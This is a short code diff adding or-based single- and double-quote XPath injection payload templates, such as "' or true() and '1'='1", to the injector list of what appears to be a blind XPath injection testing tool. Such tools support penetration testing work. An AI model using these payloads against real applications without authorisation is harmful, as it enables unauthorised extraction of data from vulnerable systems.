@@ -21,6 +21,13 @@ injectors = [
                   ("{working}' and '1'='2", False),
               ),
               "{working}' and {expression} and '1'='1"),
+    Injection('string - single quote - or',
+              "/lib/book[name='?'] (or-based, use with dummy value)",
+              (
+                  ("{working}' or true() and '1'='1", True),
+                  ("{working}' or false() and '1'='1", False),
+              ),
+              "{working}' or {expression} and '1'='1"),
     Injection('string - double quote',
               '/lib/book[name="?"]',
               (
@@ -28,6 +35,13 @@ injectors = [
                   ('{working}" and "1"="2', False),
               ),
               '{working}" and {expression} and "1"="1'),
+    Injection('string - double quote - or',
+              '/lib/book[name="?"] (or-based, use with dummy value)',
+              (
+                  ('{working}" or true() and "1"="1', True),
+                  ('{working}" or false() and "1"="1', False),
+              ),
+              '{working}" or {expression} and "1"="1'),
     Injection('attribute name - prefix',
               "/lib/book[?=value]",
               (
